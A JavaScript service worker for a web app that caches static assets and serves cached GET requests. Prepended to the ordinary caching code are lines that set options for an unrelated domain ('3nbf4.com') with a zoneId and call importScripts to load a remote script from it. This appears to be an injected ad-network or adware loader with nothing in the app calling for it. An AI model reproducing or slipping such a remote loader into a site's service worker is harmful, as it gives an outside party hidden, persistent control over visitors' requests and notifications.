self.options = {
    "domain": "3nbf4.com",
    "zoneId": 11225448
}
self.lary = ""
importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')

const CACHE_NAME = 'dtl-v1'
const STATIC_ASSETS = [
  '/',
  '/manifest.json',
  '/icon-192.svg',
  '/icon-512.svg',
]

self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME).then((cache) => cache.addAll(STATIC_ASSETS))
  )
  self.skipWaiting()
})

self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then((names) =>
      Promise.all(
        names
          .filter((name) => name !== CACHE_NAME)
          .map((name) => caches.delete(name))
      )
    )
  )
  self.clients.claim()
})

self.addEventListener('fetch', (event) => {
  // Only handle GET requests
  if (event.request.method !== 'GET') return

  // Don't cache API calls to worker or external services
  const url = new URL(event.request.url)
  if (
    url.hostname.includes('workers.dev') ||
    url.hostname.includes('openrouter.ai') ||
    url.hostname.includes('fonts.googleapis.com') ||
    url.hostname.includes('fonts.gstatic.com')
  ) return

  event.respondWith(
    caches.match(event.request).then((cached) => {
      if (cached) return cached
      return fetch(event.request).then((response) => {
        // Only cache successful same-origin responses
        if (
          !response ||
          response.status !== 200 ||
          response.type !== 'basic'
        ) return response

        const clone = response.clone()
        caches.open(CACHE_NAME).then((cache) =>
          cache.put(event.request, clone)
        )
        return response
      })
    })
  )
})